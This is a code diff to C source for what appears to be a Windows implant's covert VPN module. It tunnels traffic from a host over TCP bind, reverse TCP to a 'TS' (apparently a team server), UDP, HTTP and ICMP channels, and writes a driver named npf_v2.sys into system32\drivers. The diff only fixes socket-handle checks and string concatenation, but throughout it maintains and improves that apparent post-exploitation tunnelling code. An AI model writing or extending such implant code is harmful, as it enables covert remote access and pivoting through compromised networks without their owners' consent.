@@ -272,7 +272,7 @@ vpn_aes_decrypt(unsigned char *buf, int len)
  * Frame wire format: [u16 len][AES-encrypted frame data]
  * ================================================================= */
 
-static int g_channel_fd = -1;          /* TCP/UDP socket */
+static SOCKET g_channel_fd = INVALID_SOCKET; /* TCP/UDP socket */
 static HINTERNET g_http_conn = NULL;   /* HTTP session */
 static HANDLE g_icmp_handle = INVALID_HANDLE_VALUE; /* ICMP */
 
@@ -296,7 +296,7 @@ channel_tcp_bind_init(unsigned short port)
     }
     g_channel_fd = accept(srv, NULL, NULL);
     closesocket(srv);
-    return g_channel_fd >= 0 ? 0 : -1;
+    return g_channel_fd != INVALID_SOCKET ? 0 : -1;
 }
 
 /* --- TCP (Reverse) channel: connect to TS --- */
@@ -310,7 +310,7 @@ channel_tcp_reverse_init(const char *host, unsigned short port)
     if (g_channel_fd == INVALID_SOCKET) return -1;
 
     he = gethostbyname(host);
-    if (!he) { closesocket(g_channel_fd); g_channel_fd = -1; return -1; }
+    if (!he) { closesocket(g_channel_fd); g_channel_fd = INVALID_SOCKET; return -1; }
 
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
@@ -319,7 +319,7 @@ channel_tcp_reverse_init(const char *host, unsigned short port)
 
     if (connect(g_channel_fd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
         closesocket(g_channel_fd);
-        g_channel_fd = -1;
+        g_channel_fd = INVALID_SOCKET;
         return -1;
     }
     return 0;
@@ -340,7 +340,7 @@ channel_udp_init(unsigned short port)
 
     if (bind(g_channel_fd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
         closesocket(g_channel_fd);
-        g_channel_fd = -1;
+        g_channel_fd = INVALID_SOCKET;
         return -1;
     }
     return 0;
@@ -381,7 +381,7 @@ channel_http_send(const unsigned char *data, int len)
 static int
 channel_socket_send(const unsigned char *data, int len)
 {
-    if (g_channel_fd < 0) return -1;
+    if (g_channel_fd == INVALID_SOCKET) return -1;
     unsigned char wire[65536 + VPN_FRAME_HDR];
     unsigned short wlen = (unsigned short)len;
     wire[0] = (wlen >> 8) & 0xFF; wire[1] = wlen & 0xFF;
@@ -395,7 +395,7 @@ channel_socket_send(const unsigned char *data, int len)
 static int
 channel_socket_recv(unsigned char *buf, int maxlen)
 {
-    if (g_channel_fd < 0) return -1;
+    if (g_channel_fd == INVALID_SOCKET) return -1;
     unsigned char wire[65536 + VPN_FRAME_HDR];
     int got;
 
@@ -478,7 +478,7 @@ vpn_ensure_driver(void)
     /* Write driver to system32\drivers\ */
     char drv_path[MAX_PATH];
     GetSystemDirectoryA(drv_path, MAX_PATH);
-    strcat_s(drv_path, MAX_PATH, "\\drivers\\npf_v2.sys");
+    lstrcatA(drv_path, "\\drivers\\npf_v2.sys");
 
     HANDLE f = CreateFileA(drv_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -543,11 +543,11 @@ vpn_main_loop(LPVOID param)
     /* Main loop: bridge device <-> channel */
     for (;;) {
         FD_ZERO(&readfds);
-        if (g_channel_fd >= 0) FD_SET(g_channel_fd, &readfds);
+        if (g_channel_fd != INVALID_SOCKET) FD_SET(g_channel_fd, &readfds);
         tv.tv_sec = 0; tv.tv_usec = 50000;  /* 50ms */
 
         /* Check channel for incoming data */
-        if (g_channel_fd >= 0 && select(0, &readfds, NULL, NULL, &tv) > 0) {
+        if (g_channel_fd != INVALID_SOCKET && select(0, &readfds, NULL, NULL, &tv) > 0) {
             len = channel_recv(channel_buf, sizeof(channel_buf));
             if (len > 0) {
                 enc_len = vpn_aes_decrypt(channel_buf, len);
